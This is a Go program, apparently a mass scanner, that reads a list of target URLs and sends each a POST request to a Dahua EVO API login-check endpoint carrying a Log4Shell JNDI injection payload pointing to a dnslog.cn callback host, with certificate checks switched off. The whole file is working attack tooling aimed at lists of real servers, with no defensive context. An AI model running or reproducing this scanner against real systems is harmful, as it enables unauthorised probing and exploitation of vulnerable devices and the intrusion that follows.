package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
)

var url_list []string

func main() {
	start := time.Now()
	listUrl := list("dahuaurl.txt")
	for i, v := range listUrl {
		startscan(v, i)
	}
	end := time.Now()
	fmt.Println("用时:", end.Sub(start), "秒")
}

func startscan(url string, i int) {
	nu := strconv.Itoa(i)
	fmt.Println(nu, url)
	host := strings.Replace(url, "https://", "", -1)
	host = strings.Replace(url, "http://", "", -1)
	var req *http.Request
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	post := `{
		"loginName":"${jndi:ldap://` + nu + `.dnslog.cn}"
		}`
	req, _ = http.NewRequest("POST", url+"/evo-apigw/evo-brm/1.2.0/user/is-exist", strings.NewReader(post))
	req.Header.Set("Host", host)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36")
	req.Header.Set("Content-Type", "application/json;charset=utf-8")
	req.Header.Set("Connection", "close")
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println(url + "-- request fail")
		return
	}
	defer resp.Body.Close()
}

func list(urlfile string) []string {
	url_file, err := os.Open(urlfile)
	if err != nil {
		fmt.Println("Can't open urlfile")
	}
	defer url_file.Close()
	reader_Url := bufio.NewReader(url_file)
	for {
		url, err := reader_Url.ReadString('\n')
		url = strings.Replace(url, " ", "", -1)
		url = strings.Replace(url, "\n", "", -1)
		url = strings.Replace(url, "\r", "", -1)
		url_list = append(url_list, url)
		if err == io.EOF {
			break
		}
	}
	return url_list
}
